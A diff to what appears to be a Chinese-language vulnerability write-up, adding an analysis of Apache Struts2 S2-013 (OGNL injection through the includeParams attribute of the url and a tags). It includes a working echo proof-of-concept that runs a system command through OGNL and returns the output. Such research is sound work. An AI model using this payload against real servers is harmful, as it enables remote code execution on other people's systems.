@@ -692,17 +692,53 @@ https://cwiki.apache.org/confluence/display/WW/S2-012
 
 <img src="pic/struts2_s2-012_7.png">
 
-
 <a name="s2-013"></a>
 ## S2-013
 
+官方漏洞公告：
+https://cwiki.apache.org/confluence/display/WW/S2-013
+
+影响版本：`Struts 2.0.0` - `Struts 2.3.14.1`
+
 ## 漏洞复现与分析
 
+从漏洞公告中可获悉漏洞出现在`<s:url>`和`<s:a>`标签中的`includeParams`属性。<br>
+`includeParams`属性接收三个值：
+- `none`：表示url中不包含参数(默认就是`none`)。
+- `get`：表示url中只包含`GET`参数。
+- `all`：表示url中既包括`GET`参数也包括`POST`参数。
 
+当`<s:url>`和`<s:a>`标签指定了`includeParams`属性为`get`或`all`时，Struts2在处理url的参数时会进行两次OGNL表达式计算，从而导致注入的Java代码执行。
+
+其实这个漏洞和`S2-001`是类似的，只是这次漏洞时出现在`<s:url>`和`<s:a>`标签的处理过程中而已。
+
+下面使用`Struts 2.3.14.1`自带的示例程序`struts-blank`来调试分析。运行应用之前得修改一下首页`index.jsp`，在`<s:url>`和`<s:a>`标签中添加`includeParams="all"`，如下图：
+
+<img src="pic/struts2_s2-013_1.png">
+
+跟之前`S2-001`一样，找到`<s:url>`对应的类`URLTag`，在`doEndTag()`方法中下断点进行调试。
+
+在关键的地方，即执行OGNL表达式计算的类和方法，比如`OgnlValueStack#findValue()`下断点，一路跟下去，发现在处理url参数的过程中，会调用`TextParseUtil#translateVariables()`，后面的漏洞触发流程就跟`S2-012`一样了。
+
+所以这个漏洞其实没什么值得说道的地方，因为跟之前出现的漏洞类似。
 
 ### 可回显PoC
 
+```
+/xxx.action?fakeParam=
+%{#_memberAccess.allowStaticMethodAccess=true,
+#context['xwork.MethodAccessor.denyMethodExecution']=false,
+#is=@java.lang.Runtime@getRuntime().exec('id').getInputStream(),
+#br=new java.io.BufferedReader(new java.io.InputStreamReader(#is)),
+#res=new char[20000],
+#br.read(#res),
+#writer=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),
+#writer.println(new java.lang.String(#res)),
+#writer.flush(),
+#writer.close()}
+```
 
+<img src="pic/struts2_s2-013_20.png">
 
 ## 漏洞修复
 
